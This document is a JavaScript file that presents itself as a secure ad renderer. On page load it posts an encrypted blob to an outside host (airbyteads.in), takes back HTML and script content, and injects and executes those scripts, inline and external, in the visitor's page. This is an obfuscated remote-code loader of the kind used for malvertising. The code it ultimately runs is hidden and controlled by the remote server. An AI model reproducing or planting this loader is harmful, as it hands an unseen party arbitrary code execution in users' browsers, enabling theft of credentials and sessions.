
console.log('Fetching and rendering ad securely...');

(function() {
    const encryptedScript = "gAAAAABnkwhf5BWmra_4zM_5qpxQ2V0HD3-8gkld6KEmX7qnVSoXyJek84T5xD3AkfTelJOTkyVuxulZUf-OI4BZ6dh6GMobhgya2GhPKLO-wa0v2W_6FsRtFxrAR1q0R_Q8CvAFMPOLg41uB9zCgsVVMhn-_1ynu9WCoLbUseFI_DAhA7gtwpCoIB6YFvN785Y08YDzS6XvILtQPXaLPf45Sj_fL_pFZ1Hs9vt122QWmGyVpIsNdye0nBd0-uDPc9XUw1D4lIF6lHg5IZWhl7KdZbj821gUWET_SKAN9xF40mcnj3_HQ0A9gvY_2pd8PBMzYqo1eLJHdFZpzYMSS5ALPwu7RwROJWE-Souksmhfr90zxZ1Tb9k5QN_UGwTkPKdZz1szWyWySRkevUV1RAo-CsOZ7ssqASLMH-QPeEtiqMHrzkUUx5aydKGCsTBoGiHVqAwd8EGSsaYe7KlT5ycKwcBmt7yFPzkdcRGNz_NKkfb4sC5kDTpfyexptmHAUwu0xTtX84MK3Gh2e1uEAztWlDapmwaipBJ1mmV-WCiOfOse8-bhIrYKMlaiXX3iFd3bw6eOT0xpkjS3RP-gSNVAxMcLCH3gKGLMl00-HySZX_FNflrp5HPki57zMP64h8sQUCGfdmxMiQ0OR_2VXaHp4ANX2Sc-xAczS_LNQHtQm26VObtHKFpB9IStcz5l6ieou1TW_q5VgYUhvvK7xkmxWES7_sjO_JnNtCNtl-AwSI55LPPjHgNYt-UNFKbsEMDHnKcCpFSkcFKwl20pOUSmpaGBgY0gJlksHqHNSgK8S9Yw0jC44djkxjCBfksQDn9GALXqQlG_pSqFTHcsRveEJz9rn_lsGj6CrbF9dTe7TNdWTgGRLCAI8MjauLgNSB5gFHYRD1Diwvtad7L0z7sl6OyVhTLFatdRFjn3K2iIJ2i_RvYodGULkA0nSO6VIDvW_mZHJeoO5L1CfFVFW5jRJM4-7n2JXc6ZJIk627VlXul1a2A57ieCFvcaLxKQ4ihIapfdKvxkx6lVtRWhaxlBCZ_W69UyBFaVTrRgXyD7qglJpB6BQy2Jz4NMK76-EedfmzaWUi3WuWNu6YmlM_5dY_Om0VJx87fPmbDmC08dX7zWInYwqNR5Z8WfUryprfdaoG57I_BbBIAijJktska8w5Q12f3b-FruZB3kZ6DAH6mOCRfNkC-3KJluQsTVn8ZuojRNik4v9B_fxE4xXyPGDz2eaQa44EGofMYa-1Cm80zfVXriIxVJIkaZtglwyBTdJnaSd0SYHASFTKt-CZxAiPfrH42Esrf1ARFuKjdXjt9HDvWSTxIeZXZES8l7R-XRbzN8arSIsuVyuovDmcDBCyoHTziil0lSjAhuR8jmpUb77Ayjh6EWbDSaN_FSdkt-yeCIQ3dHOUr7iHXUnMQO-r75W-Oaccj9wcLdXvLOv958sAK-GFXXJi5eIux1BggY4TnYgPuTjNsKr00gaIW30VJl4UrPv0K4gFIVXCIhshjz4-_jKVE9D_VDUzr7QzOC7ak4yWMn-CBcD7KhGlzyFrrldNVfOWI6QyRYhnCQ9uPwoJef5DLR1Fyh5lABzja4hlDipjo8U3sz_H6XtHlpB__RQ4I79q5ATUPGEBYIklL3CoUVEHRCNO66I8hwTaW6Hl1xYUEuQDx48NBTYXNLkGwVFGzPHWeWv4EGklWKi5izofW50GmFBkHXtqBVKgwaYCW1mTalfGAmnOcjqVuLxReTBrh2XA==";

    const renderAd = () => {
        console.log('Rendering ad...');

        fetch('https://airbyteads.in/ads/decrypt_ad', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({'encrypted_script': encryptedScript})
        })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to decrypt the script:', response.statusText);
                throw new Error('Decryption failed');
            }
            return response.json();
        })
        .then(data => {
            console.log('Decrypted data:', data);

            const htmlContent = data.htmlContent || '';
            const scripts = data.scripts || [];

            // Log content for debugging
            console.log('HTML Content:', htmlContent);
            console.log('Scripts:', scripts);

            const targetContainer = document.getElementById('ad_1');
            if (!targetContainer) {
                console.error('Target container "ad_1" not found.');
                return;
            }

            // Append HTML content
            const tempContainer = document.createElement('div');
            tempContainer.innerHTML = htmlContent;
            Array.from(tempContainer.children).forEach(child => {
                if (child.tagName !== 'SCRIPT') {
                    targetContainer.appendChild(child);
                }
            });

            // Execute scripts
            scripts.forEach(script => {
                const newScript = document.createElement('script');
                if (script.src) {
                    if (!document.querySelector(`script[src="${script.src}"]`)) {
                        newScript.src = script.src;
                        newScript.async = true;
                        document.body.appendChild(newScript);
                        console.log(`Added external script: ${script.src}`);
                    } else {
                        console.log(`Skipped duplicate script: ${script.src}`);
                    }
                } else if (script.content) {
                    newScript.textContent = script.content;
                    document.body.appendChild(newScript);
                    console.log('Added inline script.');
                }
            });

            console.log('Ad rendered successfully.');
        })
        .catch(error => {
            console.error('Error rendering ad:', error);
        });
    };

    if (document.readyState === 'loading') {
        console.log('Document still loading, waiting for DOMContentLoaded...');
        document.addEventListener('DOMContentLoaded', renderAd);
    } else {
        console.log('Document is already loaded, executing renderAd immediately...');
        renderAd();
    }
})();
